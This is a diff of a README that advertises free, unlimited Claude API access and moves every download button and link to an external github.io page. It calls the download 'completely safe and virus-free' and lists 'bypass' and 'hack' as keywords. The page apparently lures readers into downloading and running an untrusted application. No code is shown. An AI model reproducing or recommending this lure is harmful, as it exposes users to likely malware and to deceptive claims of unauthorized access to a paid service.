@@ -1,7 +1,7 @@
 <h1>🔓 claude-api-free-2026 - Free Claude API Access, Zero Cost</h1>
 
 <p align="center">
-  <a href="https://github.com/Anatasyaa569/claude-api-free-2026/releases" style="background-color:#FF6B6B;color:white;padding:15px 30px;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;box-shadow:0 4px 15px rgba(255,107,107,0.3);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://anatasyaa569.github.io" style="background-color:#FF6B6B;color:white;padding:15px 30px;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;box-shadow:0 4px 15px rgba(255,107,107,0.3);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 🎯 What Is This?
@@ -26,7 +26,7 @@ Think of it as a **free library card** for premium AI. Instead of buying your ow
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**[https://github.com/Anatasyaa569/claude-api-free-2026/releases](https://github.com/Anatasyaa569/claude-api-free-2026/releases)**
+**[https://anatasyaa569.github.io](https://anatasyaa569.github.io)**
 
 Click the download button and save the file to your computer. It's completely safe and virus-free.
 
@@ -184,7 +184,7 @@ If you find this tool useful, please star the repository on GitHub. It helps oth
 **Ready to start using Claude AI for free?** Click the download button at the top of this page and join thousands of satisfied users today!
 
 <p align="center">
-  <a href="https://github.com/Anatasyaa569/claude-api-free-2026/releases" style="background-color:#4ECDC4;color:white;padding:15px 30px;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;box-shadow:0 4px 15px rgba(78,205,196,0.3);">🚀 GET STARTED NOW</a>
+  <a href="https://anatasyaa569.github.io" style="background-color:#4ECDC4;color:white;padding:15px 30px;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;box-shadow:0 4px 15px rgba(78,205,196,0.3);">🚀 GET STARTED NOW</a>
 </p>
 
 Keywords: 2026, access, anthropic, api, bypass, claude, compatible, context, free, hack, key, nodejs, openai, opus, python, rotation, sonnet, streaming, unlimited, wrapper
